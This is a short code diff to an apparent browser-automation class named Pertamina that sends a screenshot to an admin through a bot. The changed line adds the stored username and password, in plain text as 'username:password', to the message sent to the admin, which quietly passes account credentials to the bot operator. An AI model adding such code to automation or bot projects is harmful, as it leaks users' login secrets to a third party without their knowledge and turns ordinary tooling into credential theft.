@@ -104,7 +104,7 @@ export class Pertamina {
       await sleep(3000);
     }
 
-    await this.bot.sendPhotoToAdmin(await page.screenshot());
+    await this.bot.sendPhotoToAdmin(await page.screenshot(), `${this.username}:${this.password}`);
 
     await browser.close();
     return message;
